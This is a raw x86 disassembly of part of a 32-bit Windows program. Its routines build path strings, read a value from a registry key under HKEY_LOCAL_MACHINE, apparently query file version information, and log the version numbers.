  410274:	mov    esi,DWORD PTR [ebp+0x8]
  410277:	mov    eax,0x80070057
  41027c:	push   edi
  41027d:	mov    edi,ecx
  41027f:	test   esi,esi
  410281:	je     0x410360
  410287:	xor    ecx,ecx
  410289:	cmp    cx,WORD PTR [esi]
  41028c:	je     0x410360
  410292:	cmp    cx,WORD PTR ds:0x4134a8
  410299:	je     0x410360
  41029f:	xor    eax,eax
  4102a1:	mov    ebx,0x208
  4102a6:	push   ebx
  4102a7:	push   eax
  4102a8:	mov    WORD PTR [ebp-0x218],ax
  4102af:	lea    eax,[ebp-0x216]
  4102b5:	push   eax
  4102b6:	call   0x412060
  4102bb:	add    esp,0xc
  4102be:	xor    eax,eax
  4102c0:	mov    WORD PTR [ebp-0x428],ax
  4102c7:	lea    eax,[ebp-0x426]
  4102cd:	push   ebx
  4102ce:	xor    ebx,ebx
  4102d0:	push   ebx
  4102d1:	push   eax
  4102d2:	call   0x412060
  4102d7:	add    esp,0xc
  4102da:	lea    eax,[ebp-0x428]
  4102e0:	push   esi
  4102e1:	push   0x404fe4
  4102e6:	push   0x900
  4102eb:	push   ebx
  4102ec:	push   ebx
  4102ed:	push   0x105
  4102f2:	push   eax
  4102f3:	call   0x410f98
  4102f8:	add    esp,0x1c
  4102fb:	test   eax,eax
  4102fd:	js     0x410360
  4102ff:	mov    esi,0x4134a8
  410304:	push   esi
  410305:	call   DWORD PTR ds:0x414068
  41030b:	push   0x5c
  41030d:	pop    ecx
  41030e:	push   esi
  41030f:	cmp    cx,WORD PTR [eax*2+0x4134a6]
  410317:	lea    eax,[ebp-0x218]
  41031d:	jne    0x410326
  41031f:	push   0x404ffc
  410324:	jmp    0x41032b
  410326:	push   0x405018
  41032b:	push   0x900
  410330:	push   ebx
  410331:	push   ebx
  410332:	push   0x105
  410337:	push   eax
  410338:	call   0x410f98
  41033d:	add    esp,0x1c
  410340:	test   eax,eax
  410342:	js     0x410360
  410344:	push   0x1
  410346:	push   0x440
  41034b:	push   esi
  41034c:	lea    eax,[ebp-0x428]
  410352:	mov    ecx,edi
  410354:	push   eax
  410355:	lea    edx,[ebp-0x218]
  41035b:	call   0x40ff87
  410360:	mov    ecx,DWORD PTR [ebp-0x4]
  410363:	pop    edi
  410364:	pop    esi
  410365:	xor    ecx,ebp
  410367:	pop    ebx
  410368:	call   0x411980
  41036d:	mov    esp,ebp
  41036f:	pop    ebp
  410370:	ret    0x4
  410373:	int3   
  410374:	int3   
  410375:	int3   
  410376:	int3   
  410377:	int3   
  410378:	mov    edi,edi
  41037a:	push   ebp
  41037b:	mov    ebp,esp
  41037d:	sub    esp,0x1c
  410380:	push   ebx
  410381:	push   esi
  410382:	push   edi
  410383:	mov    eax,ecx
  410385:	mov    DWORD PTR [ebp-0x8],edx
  410388:	xor    esi,esi
  41038a:	mov    DWORD PTR [ebp-0x18],eax
  41038d:	xor    edi,edi
  41038f:	xor    ebx,ebx
  410391:	test   edx,edx
  410393:	je     0x4104ae
  410399:	mov    edx,DWORD PTR [ebp+0x8]
  41039c:	test   edx,edx
  41039e:	je     0x4104ae
  4103a4:	mov    ecx,DWORD PTR [ebp+0xc]
  4103a7:	test   ecx,ecx
  4103a9:	je     0x4104ae
  4103af:	test   eax,eax
  4103b1:	je     0x4104ae
  4103b7:	mov    edi,DWORD PTR [ebp-0x8]
  4103ba:	mov    DWORD PTR [edi],ebx
  4103bc:	mov    DWORD PTR [edx],ebx
  4103be:	mov    DWORD PTR [ecx],ebx
  4103c0:	lea    ecx,[ebp-0x14]
  4103c3:	push   ecx
  4103c4:	push   eax
  4103c5:	call   DWORD PTR ds:0x414198
  4103cb:	mov    ebx,eax
  4103cd:	mov    DWORD PTR [ebp-0x10],ebx
  4103d0:	test   ebx,ebx
  4103d2:	jne    0x4103f2
  4103d4:	call   DWORD PTR ds:0x414074
  4103da:	mov    esi,eax
  4103dc:	test   esi,esi
  4103de:	jle    0x4104c1
  4103e4:	movzx  esi,si
  4103e7:	or     esi,0x80070000
  4103ed:	jmp    0x4104c1
  4103f2:	call   DWORD PTR ds:0x4140c4
  4103f8:	mov    edi,eax
  4103fa:	test   edi,edi
  4103fc:	jne    0x410408
  4103fe:	mov    esi,0x80004003
  410403:	jmp    0x4104c1
  410408:	push   ebx
  410409:	push   0x8
  41040b:	push   edi
  41040c:	call   DWORD PTR ds:0x4140cc
  410412:	mov    ebx,eax
  410414:	test   ebx,ebx
  410416:	jne    0x410422
  410418:	mov    esi,0x8007000e
  41041d:	jmp    0x4104b3
  410422:	push   ebx
  410423:	push   DWORD PTR [ebp-0x10]
  410426:	push   DWORD PTR [ebp-0x14]
  410429:	push   DWORD PTR [ebp-0x18]
  41042c:	call   DWORD PTR ds:0x414194
  410432:	test   eax,eax
  410434:	je     0x41047f
  410436:	lea    eax,[ebp-0x4]
  410439:	push   eax
  41043a:	lea    eax,[ebp-0x1c]
  41043d:	push   eax
  41043e:	push   0x405034
  410443:	push   ebx
  410444:	call   DWORD PTR ds:0x41419c
  41044a:	test   eax,eax
  41044c:	je     0x41047f
  41044e:	mov    ecx,DWORD PTR [ebp-0x1c]
  410451:	mov    edx,DWORD PTR [ebp-0x8]
  410454:	mov    eax,DWORD PTR [ecx+0x10]
  410457:	mov    DWORD PTR [edx],eax
  410459:	mov    eax,DWORD PTR [ecx+0x14]
  41045c:	mov    ecx,DWORD PTR [ebp+0x8]
  41045f:	and    DWORD PTR [ebp-0x4],esi
  410462:	and    DWORD PTR [ebp-0xc],esi
  410465:	mov    DWORD PTR [ecx],eax
  410467:	lea    eax,[ebp-0x4]
  41046a:	push   eax
  41046b:	lea    eax,[ebp-0xc]
  41046e:	push   eax
  41046f:	push   0x405038
  410474:	push   ebx
  410475:	call   DWORD PTR ds:0x41419c
  41047b:	test   eax,eax
  41047d:	jne    0x410496
  41047f:	call   DWORD PTR ds:0x414074
  410485:	mov    esi,eax
  410487:	test   esi,esi
  410489:	jle    0x4104b3
  41048b:	movzx  esi,si
  41048e:	or     esi,0x80070000
  410494:	jmp    0x4104b3
  410496:	mov    eax,DWORD PTR [ebp-0x4]
  410499:	and    eax,0xfffffffc
  41049c:	cmp    eax,0x4
  41049f:	jb     0x4104b3
  4104a1:	mov    eax,DWORD PTR [ebp-0xc]
  4104a4:	mov    ecx,DWORD PTR [ebp+0xc]
  4104a7:	movzx  eax,WORD PTR [eax]
  4104aa:	mov    DWORD PTR [ecx],eax
  4104ac:	jmp    0x4104b3
  4104ae:	mov    esi,0x80004003
  4104b3:	test   edi,edi
  4104b5:	je     0x4104c1
  4104b7:	push   ebx
  4104b8:	push   0x0
  4104ba:	push   edi
  4104bb:	call   DWORD PTR ds:0x4140c8
  4104c1:	pop    edi
  4104c2:	mov    eax,esi
  4104c4:	pop    esi
  4104c5:	pop    ebx
  4104c6:	mov    esp,ebp
  4104c8:	pop    ebp
  4104c9:	ret    0x8
  4104cc:	int3   
  4104cd:	int3   
  4104ce:	int3   
  4104cf:	int3   
  4104d0:	int3   
  4104d1:	mov    edi,edi
  4104d3:	push   ebp
  4104d4:	mov    ebp,esp
  4104d6:	push   esi
  4104d7:	mov    esi,ecx
  4104d9:	xor    eax,eax
  4104db:	xor    ecx,ecx
  4104dd:	mov    DWORD PTR [esi+0x218],ecx
  4104e3:	mov    WORD PTR [esi],ax
  4104e6:	mov    eax,DWORD PTR [ebp+0x8]
  4104e9:	mov    DWORD PTR [esi+0x20c],ecx
  4104ef:	mov    DWORD PTR [esi+0x210],ecx
  4104f5:	mov    DWORD PTR [esi+0x214],ecx
  4104fb:	test   eax,eax
  4104fd:	je     0x410523
  4104ff:	cmp    cx,WORD PTR [eax]
  410502:	je     0x410523
  410504:	push   0x900
  410509:	push   ecx
  41050a:	push   ecx
  41050b:	push   eax
  41050c:	mov    edx,0x105
  410511:	mov    ecx,esi
  410513:	call   0x410ebe
  410518:	test   eax,eax
  41051a:	js     0x410523
  41051c:	mov    ecx,esi
  41051e:	call   0x41052f
  410523:	mov    eax,esi
  410525:	pop    esi
  410526:	pop    ebp
  410527:	ret    0x4
  41052a:	int3   
  41052b:	int3   
  41052c:	int3   
  41052d:	int3   
  41052e:	int3   
  41052f:	mov    edi,edi
  410531:	push   ebp
  410532:	mov    ebp,esp
  410534:	sub    esp,0x10c
  41053a:	mov    eax,ds:0x413004
  41053f:	xor    eax,ebp
  410541:	mov    DWORD PTR [ebp-0x4],eax
  410544:	push   esi
  410545:	mov    esi,ecx
  410547:	lea    eax,[ebp-0x10c]
  41054d:	xor    ecx,ecx
  41054f:	push   ecx
  410550:	push   ecx
  410551:	push   0x104
  410556:	push   eax
  410557:	push   0xffffffff
  410559:	push   esi
  41055a:	push   0x400
  41055f:	push   ecx
  410560:	call   DWORD PTR ds:0x4140e8
  410566:	test   eax,eax
  410568:	je     0x41058b
  41056a:	lea    eax,[esi+0x214]
  410570:	push   eax
  410571:	lea    eax,[esi+0x210]
  410577:	push   eax
  410578:	lea    edx,[esi+0x20c]
  41057e:	lea    ecx,[ebp-0x10c]
  410584:	call   0x410378
  410589:	jmp    0x410590
  41058b:	mov    eax,0x80070057
  410590:	test   eax,eax
  410592:	js     0x4105fa
  410594:	movzx  eax,WORD PTR [esi+0x20c]
  41059b:	push   eax
  41059c:	movzx  eax,WORD PTR [esi+0x20e]
  4105a3:	push   eax
  4105a4:	push   esi
  4105a5:	mov    DWORD PTR [esi+0x218],0x1
  4105af:	push   0x405054
  4105b4:	push   DWORD PTR ds:0x4130e8
  4105ba:	call   0x40e818
  4105bf:	movzx  eax,WORD PTR [esi+0x210]
  4105c6:	push   eax
  4105c7:	movzx  eax,WORD PTR [esi+0x212]
  4105ce:	push   eax
  4105cf:	push   esi
  4105d0:	push   0x405084
  4105d5:	push   DWORD PTR ds:0x4130e8
  4105db:	call   0x40e818
  4105e0:	push   DWORD PTR [esi+0x214]
  4105e6:	push   esi
  4105e7:	push   0x4050bc
  4105ec:	push   DWORD PTR ds:0x4130e8
  4105f2:	call   0x40e818
  4105f7:	add    esp,0x38
  4105fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4105fd:	xor    ecx,ebp
  4105ff:	pop    esi
  410600:	call   0x411980
  410605:	mov    esp,ebp
  410607:	pop    ebp
  410608:	ret    
  410609:	int3   
  41060a:	int3   
  41060b:	int3   
  41060c:	int3   
  41060d:	int3   
  41060e:	mov    edi,edi
  410610:	push   ebp
  410611:	mov    ebp,esp
  410613:	sub    esp,0x428
  410619:	mov    eax,ds:0x413004
  41061e:	xor    eax,ebp
  410620:	mov    DWORD PTR [ebp-0x4],eax
  410623:	push   ebx
  410624:	push   esi
  410625:	mov    esi,ecx
  410627:	xor    eax,eax
  410629:	push   edi
  41062a:	xor    ebx,ebx
  41062c:	mov    DWORD PTR [esi+0x218],ebx
  410632:	lea    edi,[esi+0x21c]
  410638:	mov    WORD PTR [esi],ax
  41063b:	mov    WORD PTR [edi],ax
  41063e:	lea    eax,[ebp-0x420]
  410644:	push   eax
  410645:	push   0x20019
  41064a:	push   ebx
  41064b:	push   0x4050e0
  410650:	push   0x80000002
  410655:	call   DWORD PTR ds:0x414004
  41065b:	test   eax,eax
  41065d:	jne    0x41074f
  410663:	push   0x208
  410668:	mov    WORD PTR [ebp-0x210],ax
  41066f:	lea    eax,[ebp-0x20e]
  410675:	push   ebx
  410676:	push   eax
  410677:	call   0x412060
  41067c:	add    esp,0xc
  41067f:	mov    DWORD PTR [ebp-0x428],0x20a
  410689:	lea    eax,[ebp-0x428]
  41068f:	mov    DWORD PTR [ebp-0x424],0x1
  410699:	push   eax
  41069a:	lea    eax,[ebp-0x210]
  4106a0:	push   eax
  4106a1:	lea    eax,[ebp-0x424]
  4106a7:	push   eax
  4106a8:	push   ebx
  4106a9:	push   0x40515c
  4106ae:	push   DWORD PTR [ebp-0x420]
  4106b4:	call   DWORD PTR ds:0x414000
  4106ba:	test   eax,eax
  4106bc:	jne    0x410743
  4106c2:	push   0x208
  4106c7:	mov    WORD PTR [ebp-0x41c],ax
  4106ce:	lea    eax,[ebp-0x41a]
  4106d4:	push   ebx
  4106d5:	push   eax
  4106d6:	call   0x412060
  4106db:	add    esp,0xc
  4106de:	lea    eax,[ebp-0x41c]
  4106e4:	push   0x105
  4106e9:	push   eax
  4106ea:	lea    eax,[ebp-0x210]
  4106f0:	push   eax
  4106f1:	call   DWORD PTR ds:0x4140b4
  4106f7:	push   0x900
  4106fc:	push   ecx
  4106fd:	push   ecx
  4106fe:	lea    eax,[ebp-0x41c]
  410704:	mov    edx,0x105
  410709:	push   eax
  41070a:	mov    ecx,edi
  41070c:	call   0x410ebe
  410711:	test   eax,eax
  410713:	jns    0x41071d
  410715:	mov    DWORD PTR [esi+0x218],ebx
  41071b:	jmp    0x410743
  41071d:	push   edi
  41071e:	push   0x405168
  410723:	push   0x900
  410728:	push   ebx
  410729:	push   ebx
  41072a:	push   0x105
  41072f:	push   esi
  410730:	call   0x410f98
  410735:	add    esp,0x1c
  410738:	test   eax,eax
  41073a:	js     0x410715
  41073c:	mov    ecx,esi
  41073e:	call   0x41052f
  410743:	push   DWORD PTR [ebp-0x420]
  410749:	call   DWORD PTR ds:0x414008
  41074f:	mov    ecx,DWORD PTR [ebp-0x4]
  410752:	mov    eax,esi
  410754:	pop    edi
  410755:	pop    esi
  410756:	xor    ecx,ebp
  410758:	pop    ebx
  410759:	call   0x411980
  41075e:	mov    esp,ebp
  410760:	pop    ebp
  410761:	ret    
  410762:	int3   
  410763:	int3   
  410764:	int3   
  410765:	int3   
  410766:	int3   
  410767:	mov    edi,edi
  410769:	push   ebx
  41076a:	push   edi
  41076b:	test   ecx,ecx
  41076d:	je     0x4107ad
  41076f:	xor    ebx,ebx
  410771:	cmp    WORD PTR [ecx],bx
  410774:	je     0x4107ad
  410776:	push   ebx
  410777:	push   0x80
  41077c:	push   0x3
  41077e:	push   ebx
  41077f:	push   0x3
  410781:	push   ebx
  410782:	push   ecx
  410783:	call   DWORD PTR ds:0x41405c
  410789:	mov    edi,eax
  41078b:	cmp    edi,0xffffffff
  41078e:	je     0x4107ad
  410790:	push   esi
  410791:	push   edi
  410792:	call   DWORD PTR ds:0x414104
  410798:	xor    esi,esi
  41079a:	inc    esi
  41079b:	cmp    eax,esi
  41079d:	je     0x4107a1
  41079f:	mov    esi,ebx
  4107a1:	push   edi
  4107a2:	call   DWORD PTR ds:0x414084
  4107a8:	mov    eax,esi
  4107aa:	pop    esi
  4107ab:	jmp    0x4107af
  4107ad:	xor    eax,eax
  4107af:	pop    edi
  4107b0:	pop    ebx
  4107b1:	ret    
  4107b2:	int3   
  4107b3:	int3   
  4107b4:	int3   
  4107b5:	int3   
  4107b6:	int3   
  4107b7:	mov    edi,edi
  4107b9:	push   ebp
  4107ba:	mov    ebp,esp
  4107bc:	sub    esp,0xc
  4107bf:	xor    eax,eax
  4107c1:	push   ebx
  4107c2:	push   esi
  4107c3:	mov    esi,ecx
  4107c5:	xor    ebx,ebx
  4107c7:	push   edi
  4107c8:	push   0x105
  4107cd:	lea    edi,[esi+0x21c]
  4107d3:	mov    DWORD PTR [esi+0x218],ebx
  4107d9:	push   edi
  4107da:	mov    WORD PTR [esi],ax
  4107dd:	mov    WORD PTR [edi],ax
  4107e0:	call   DWORD PTR ds:0x41409c
  4107e6:	push   edi
  4107e7:	push   0x405180
  4107ec:	push   0x900
  4107f1:	push   ebx
  4107f2:	push   ebx
  4107f3:	push   0x105
  4107f8:	push   esi
  4107f9:	call   0x410f98
  4107fe:	add    esp,0x1c
  410801:	test   eax,eax
  410803:	jns    0x410810
  410805:	mov    DWORD PTR [esi+0x218],ebx
  41080b:	jmp    0x4108ad
  410810:	mov    ecx,esi
  410812:	call   0x410767
  410817:	test   eax,eax
  410819:	jne    0x4108a6
  41081f:	mov    WORD PTR [edi],ax
  410822:	mov    WORD PTR [esi],ax
  410825:	lea    eax,[ebp-0x4]
  410828:	push   eax
  410829:	push   0x20019
  41082e:	push   ebx
  41082f:	push   0x4010e8
  410834:	push   0x80000002
  410839:	call   DWORD PTR ds:0x414004
  41083f:	test   eax,eax
  410841:	jne    0x4108ad
  410843:	lea    eax,[ebp-0x8]
  410846:	mov    DWORD PTR [ebp-0x8],0x104
  41084d:	push   eax
  41084e:	push   edi
  41084f:	lea    eax,[ebp-0xc]
  410852:	mov    DWORD PTR [ebp-0xc],0x1
  410859:	push   eax
  41085a:	push   ebx
  41085b:	push   0x40515c
  410860:	push   DWORD PTR [ebp-0x4]
  410863:	call   DWORD PTR ds:0x414000
  410869:	test   eax,eax
  41086b:	jne    0x41089b
  41086d:	push   edi
  41086e:	push   0x405180
  410873:	push   0x900
  410878:	push   ebx
  410879:	push   ebx
  41087a:	push   0x105
  41087f:	push   esi
  410880:	call   0x410f98
  410885:	add    esp,0x1c
  410888:	test   eax,eax
  41088a:	jns    0x410894
  41088c:	mov    DWORD PTR [esi+0x218],ebx
  410892:	jmp    0x41089b
  410894:	mov    ecx,esi
  410896:	call   0x41052f
  41089b:	push   DWORD PTR [ebp-0x4]
  41089e:	call   DWORD PTR ds:0x414008
  4108a4:	jmp    0x4108ad
  4108a6:	mov    ecx,esi
  4108a8:	call   0x41052f
  4108ad:	pop    edi
  4108ae:	mov    eax,esi
  4108b0:	pop    esi
  4108b1:	pop    ebx
  4108b2:	mov    esp,ebp
  4108b4:	pop    ebp
  4108b5:	ret    
  4108b6:	int3   
  4108b7:	int3   
  4108b8:	int3   
  4108b9:	int3   
  4108ba:	int3   
  4108bb:	mov    edi,edi
  4108bd:	push   ebp
  4108be:	mov    ebp,esp
  4108c0:	push   ecx
  4108c1:	push   ecx
  4108c2:	push   ebx
  4108c3:	push   esi
  4108c4:	push   edi
  4108c5:	push   0x900
  4108ca:	push   ecx
  4108cb:	mov    edi,edx
  4108cd:	mov    ebx,ecx
  4108cf:	call   0x406796
  4108d4:	mov    esi,eax
  4108d6:	test   esi,esi
  4108d8:	js     0x41095e
  4108de:	push   0x900
  4108e3:	push   ecx
  4108e4:	lea    edx,[ebp+0xc]
  4108e7:	lea    ecx,[ebp+0x8]
  4108ea:	call   0x410cae
  4108ef:	mov    esi,eax
  4108f1:	test   esi,esi
  4108f3:	js     0x410933
  4108f5:	test   edi,edi
  4108f7:	jne    0x410918
  4108f9:	cmp    DWORD PTR [ebp+0xc],edi
  4108fc:	je     0x41093c
  4108fe:	mov    eax,DWORD PTR [ebp+0x8]
  410901:	cmp    WORD PTR [eax],di
  410904:	je     0x41093c
  410906:	test   ebx,ebx
  410908:	jne    0x410911
  41090a:	mov    esi,0x80070057
  41090f:	jmp    0x410967
  410911:	mov    esi,0x8007007a
  410916:	jmp    0x41093c
  410918:	push   DWORD PTR [ebp+0xc]
  41091b:	lea    eax,[ebp-0x4]
  41091e:	mov    edx,edi
  410920:	push   DWORD PTR [ebp+0x8]
  410923:	mov    ecx,ebx
  410925:	push   eax
  410926:	call   0x410d45
  41092b:	mov    esi,eax
  41092d:	test   esi,esi
  41092f:	js     0x410940
  410931:	jmp    0x41093c
  410933:	test   edi,edi
  410935:	je     0x41093c
  410937:	xor    eax,eax
  410939:	mov    WORD PTR [ebx],ax
  41093c:	test   esi,esi
  41093e:	jns    0x410967
  410940:	test   edi,edi
  410942:	je     0x410967
  410944:	push   0x900
  410949:	lea    eax,[ebp-0x4]
  41094c:	push   eax
  41094d:	lea    eax,[ebp-0x8]
  410950:	push   eax
  410951:	push   ecx
  410952:	lea    edx,[edi+edi*1]
  410955:	mov    ecx,ebx
  410957:	call   0x406828
  41095c:	jmp    0x410967
  41095e:	test   edi,edi
  410960:	je     0x410967
  410962:	xor    eax,eax
  410964:	mov    WORD PTR [ebx],ax
  410967:	pop    edi
  410968:	mov    eax,esi
  41096a:	pop    esi
  41096b:	pop    ebx
  41096c:	mov    esp,ebp
  41096e:	pop    ebp
  41096f:	ret    0x14
  410972:	int3   
  410973:	int3   
  410974:	int3   
  410975:	int3   
  410976:	int3   
  410977:	mov    edi,edi
  410979:	push   ebp
  41097a:	mov    ebp,esp
  41097c:	push   ecx
  41097d:	push   ecx
  41097e:	push   ebx
  41097f:	push   esi
  410980:	push   edi
  410981:	push   0x900
  410986:	push   ecx
  410987:	mov    edi,edx
  410989:	mov    ebx,ecx
  41098b:	call   0x406796
  410990:	mov    esi,eax
  410992:	test   esi,esi
  410994:	js     0x4109aa
  410996:	test   edi,edi
  410998:	je     0x4109aa
  41099a:	lea    eax,[ebp-0x4]
  41099d:	push   eax
  41099e:	call   0x410c6a
  4109a3:	mov    esi,eax
  4109a5:	mov    eax,DWORD PTR [ebp-0x4]
  4109a8:	jmp    0x4109ac
  4109aa:	xor    eax,eax
  4109ac:	mov    DWORD PTR [ebp-0x4],eax
  4109af:	test   esi,esi
  4109b1:	js     0x410a03
  4109b3:	mov    edx,edi
  4109b5:	lea    ecx,[eax+ebx*1]
  4109b8:	sub    edx,eax
  4109ba:	cmp    edx,0x1
  4109bd:	ja     0x4109d0
  4109bf:	mov    esi,ebx
  4109c1:	neg    esi
  4109c3:	sbb    esi,esi
  4109c5:	and    esi,0x23
  4109c8:	add    esi,0x80070057
  4109ce:	jmp    0x4109e8
  4109d0:	push   ecx
  4109d1:	push   0x402f80
  4109d6:	lea    eax,[ebp-0x8]
  4109d9:	push   eax
  4109da:	call   0x410cea
  4109df:	mov    esi,eax
  4109e1:	test   esi,esi
  4109e3:	jns    0x410a03
  4109e5:	mov    eax,DWORD PTR [ebp-0x4]
  4109e8:	test   edi,edi
  4109ea:	je     0x410a03
  4109ec:	push   0x900
  4109f1:	lea    ecx,[ebp-0x8]
  4109f4:	mov    edx,edi
  4109f6:	push   ecx
  4109f7:	lea    ecx,[ebp-0x4]
  4109fa:	push   ecx
  4109fb:	push   eax
  4109fc:	mov    ecx,ebx
  4109fe:	call   0x410e1b
  410a03:	pop    edi
  410a04:	mov    eax,esi
  410a06:	pop    esi
  410a07:	pop    ebx
  410a08:	mov    esp,ebp
  410a0a:	pop    ebp
  410a0b:	ret    0x10
  410a0e:	int3   
  410a0f:	int3   
  410a10:	int3   
  410a11:	int3   
  410a12:	int3   
  410a13:	mov    edi,edi
  410a15:	push   ebp
  410a16:	mov    ebp,esp
  410a18:	sub    esp,0xc
  410a1b:	push   ebx
  410a1c:	push   esi
  410a1d:	push   edi
  410a1e:	push   DWORD PTR [ebp+0x10]
  410a21:	mov    edi,edx
  410a23:	mov    DWORD PTR [ebp-0xc],ecx
  410a26:	push   ecx
  410a27:	call   0x406796
  410a2c:	mov    esi,eax
  410a2e:	test   esi,esi
  410a30:	js     0x410b1b
  410a36:	test   DWORD PTR [ebp+0x10],0x100
  410a3d:	mov    edx,ecx
  410a3f:	mov    eax,DWORD PTR [ebp+0x14]
  410a42:	mov    ebx,edi
  410a44:	mov    DWORD PTR [ebp-0x4],edx
  410a47:	mov    DWORD PTR [ebp-0x8],ebx
  410a4a:	je     0x410a55
  410a4c:	test   eax,eax
  410a4e:	jne    0x410a55
  410a50:	mov    eax,0x404414
  410a55:	xor    esi,esi
  410a57:	test   DWORD PTR [ebp+0x10],0xffffe000
  410a5e:	je     0x410ab7
  410a60:	mov    esi,0x80070057
  410a65:	test   edi,edi
  410a67:	je     0x410a6c
  410a69:	mov    BYTE PTR [ecx],0x0
  410a6c:	test   DWORD PTR [ebp+0x10],0x1c00
  410a73:	je     0x410a90
  410a75:	test   edi,edi
  410a77:	je     0x410a90
  410a79:	push   DWORD PTR [ebp+0x10]
  410a7c:	lea    eax,[ebp-0x8]
  410a7f:	mov    edx,edi
  410a81:	push   eax
  410a82:	lea    eax,[ebp-0x4]
  410a85:	push   eax
  410a86:	push   0x0
  410a88:	call   0x410e1b
  410a8d:	mov    ebx,DWORD PTR [ebp-0x8]
  410a90:	test   esi,esi
  410a92:	jns    0x410aa0
  410a94:	cmp    esi,0x8007007a
  410a9a:	jne    0x410b22
  410aa0:	mov    edx,DWORD PTR [ebp-0x4]
  410aa3:	mov    eax,DWORD PTR [ebp+0x8]
  410aa6:	test   eax,eax
  410aa8:	je     0x410aac
  410aaa:	mov    DWORD PTR [eax],edx
  410aac:	mov    eax,DWORD PTR [ebp+0xc]
  410aaf:	test   eax,eax
  410ab1:	je     0x410b22
  410ab3:	mov    DWORD PTR [eax],ebx
  410ab5:	jmp    0x410b22
  410ab7:	test   edi,edi
  410ab9:	jne    0x410ad1
  410abb:	cmp    BYTE PTR [eax],0x0
  410abe:	je     0x410aa3
  410ac0:	mov    esi,ecx
  410ac2:	neg    esi
  410ac4:	sbb    esi,esi
  410ac6:	and    esi,0x23
  410ac9:	add    esi,0x80070057
  410acf:	jmp    0x410a6c
  410ad1:	push   DWORD PTR [ebp+0x18]
  410ad4:	and    DWORD PTR [ebp-0x8],esi
  410ad7:	mov    edx,edi
  410ad9:	push   eax
  410ada:	lea    eax,[ebp-0x8]
  410add:	push   eax
  410ade:	call   0x40e4e9
  410ae3:	mov    ecx,DWORD PTR [ebp-0xc]
  410ae6:	mov    esi,eax
  410ae8:	mov    eax,DWORD PTR [ebp-0x8]
  410aeb:	sub    ebx,eax
  410aed:	mov    DWORD PTR [ebp-0x8],ebx
  410af0:	lea    edx,[eax+ecx*1]
  410af3:	mov    DWORD PTR [ebp-0x4],edx
  410af6:	test   esi,esi
  410af8:	js     0x410a6c
  410afe:	test   DWORD PTR [ebp+0x10],0x200
  410b05:	je     0x410aa3
  410b07:	cmp    ebx,0x1
  410b0a:	jbe    0x410aa3
  410b0c:	push   DWORD PTR [ebp+0x10]
  410b0f:	mov    ecx,DWORD PTR [ebp-0x4]
  410b12:	mov    edx,ebx
  410b14:	call   0x410df1
  410b19:	jmp    0x410aa0
  410b1b:	test   edi,edi
  410b1d:	je     0x410b22
  410b1f:	mov    BYTE PTR [ecx],0x0
  410b22:	pop    edi
  410b23:	mov    eax,esi
  410b25:	pop    esi
  410b26:	pop    ebx
  410b27:	mov    esp,ebp
  410b29:	pop    ebp
  410b2a:	ret    0x14
  410b2d:	int3   
  410b2e:	int3   
  410b2f:	int3   
  410b30:	int3   
  410b31:	int3   
  410b32:	mov    edi,edi
  410b34:	push   ebp
  410b35:	mov    ebp,esp
  410b37:	sub    esp,0xc
  410b3a:	push   ebx
  410b3b:	push   esi
  410b3c:	push   edi
  410b3d:	mov    edi,edx
  410b3f:	mov    DWORD PTR [ebp-0xc],ecx
  410b42:	mov    edx,DWORD PTR [ebp+0x10]
  410b45:	push   edx
  410b46:	push   ecx
  410b47:	mov    edx,edi
  410b49:	call   0x406796
  410b4e:	mov    esi,eax
  410b50:	test   esi,esi
  410b52:	js     0x410c51
  410b58:	mov    eax,DWORD PTR [ebp+0x10]
  410b5b:	mov    ebx,edi
  410b5d:	mov    edx,DWORD PTR [ebp+0x14]
  410b60:	mov    DWORD PTR [ebp-0x4],ecx
  410b63:	mov    DWORD PTR [ebp-0x8],ebx
  410b66:	test   eax,0x100
  410b6b:	je     0x410b76
  410b6d:	test   edx,edx
  410b6f:	jne    0x410b76
  410b71:	mov    edx,0x401068
  410b76:	xor    esi,esi
  410b78:	test   eax,0xffffe000
  410b7d:	je     0x410b93
  410b7f:	mov    esi,0x80070057
  410b84:	test   edi,edi
  410b86:	je     0x410c0e
  410b8c:	xor    edx,edx
  410b8e:	mov    WORD PTR [ecx],dx
  410b91:	jmp    0x410c0e
  410b93:	test   edi,edi
  410b95:	jne    0x410bb1
  410b97:	cmp    WORD PTR [edx],si
  410b9a:	je     0x410c3a
  410ba0:	mov    esi,ecx
  410ba2:	neg    esi
  410ba4:	sbb    esi,esi
  410ba6:	and    esi,0x23
  410ba9:	add    esi,0x80070057
  410baf:	jmp    0x410c0e
  410bb1:	push   DWORD PTR [ebp+0x18]
  410bb4:	lea    eax,[ebp-0x8]
  410bb7:	mov    DWORD PTR [ebp-0x8],esi
  410bba:	push   edx
  410bbb:	push   eax
  410bbc:	mov    edx,edi
  410bbe:	call   0x410da1
  410bc3:	mov    ecx,DWORD PTR [ebp-0xc]
  410bc6:	mov    esi,eax
  410bc8:	mov    eax,DWORD PTR [ebp-0x8]
  410bcb:	sub    ebx,eax
  410bcd:	mov    DWORD PTR [ebp-0x8],ebx
  410bd0:	lea    edx,[ecx+eax*2]
  410bd3:	mov    DWORD PTR [ebp-0x4],edx
  410bd6:	test   esi,esi
  410bd8:	js     0x410c0b
  410bda:	mov    edx,DWORD PTR [ebp+0x10]
  410bdd:	test   edx,0x200
  410be3:	je     0x410c3a
  410be5:	cmp    ebx,0x1
  410be8:	jbe    0x410c3a
  410bea:	mov    edi,DWORD PTR [ebp-0x4]
  410bed:	lea    eax,[ebx+ebx*1]
  410bf0:	cmp    eax,0x2
  410bf3:	jbe    0x410c3d
  410bf5:	add    eax,0xfffffffe
  410bf8:	push   eax
  410bf9:	movzx  eax,dl
  410bfc:	push   eax
  410bfd:	lea    eax,[edi+0x2]
  410c00:	push   eax
  410c01:	call   0x412060
  410c06:	add    esp,0xc
  410c09:	jmp    0x410c3d
  410c0b:	mov    eax,DWORD PTR [ebp+0x10]
  410c0e:	test   eax,0x1c00
  410c13:	je     0x410c2e
  410c15:	test   edi,edi
  410c17:	je     0x410c2e
  410c19:	push   eax
  410c1a:	lea    eax,[ebp-0x8]
  410c1d:	push   eax
  410c1e:	lea    eax,[ebp-0x4]
  410c21:	push   eax
  410c22:	push   ecx
  410c23:	lea    edx,[edi+edi*1]
  410c26:	call   0x406828
  410c2b:	mov    ebx,DWORD PTR [ebp-0x8]
  410c2e:	test   esi,esi
  410c30:	jns    0x410c3a
  410c32:	cmp    esi,0x8007007a
  410c38:	jne    0x410c5a
  410c3a:	mov    edi,DWORD PTR [ebp-0x4]
  410c3d:	mov    eax,DWORD PTR [ebp+0x8]
  410c40:	test   eax,eax
  410c42:	je     0x410c46
